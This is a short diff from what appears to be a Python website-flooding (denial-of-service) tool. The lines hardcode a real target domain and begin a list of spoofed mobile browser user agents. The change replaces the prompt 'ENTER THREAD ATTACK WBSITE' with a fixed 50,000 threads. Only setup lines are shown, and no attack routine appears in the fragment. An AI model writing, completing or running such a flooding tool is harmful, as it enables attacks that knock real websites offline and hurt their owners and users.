@@ -26,7 +26,7 @@ def banner():
 banner()
 print("\033[1;31m!!KHI NHẬP WEBSITE LƯU Í PHẢI NHẬP https://")
 host = ("https://duymmo.io.vn/")
-thread = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] ENTER THREAD ATTACK WBSITE (1000/150000): ")))
+thread = ("50000")
 
 user_agents = [
     "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
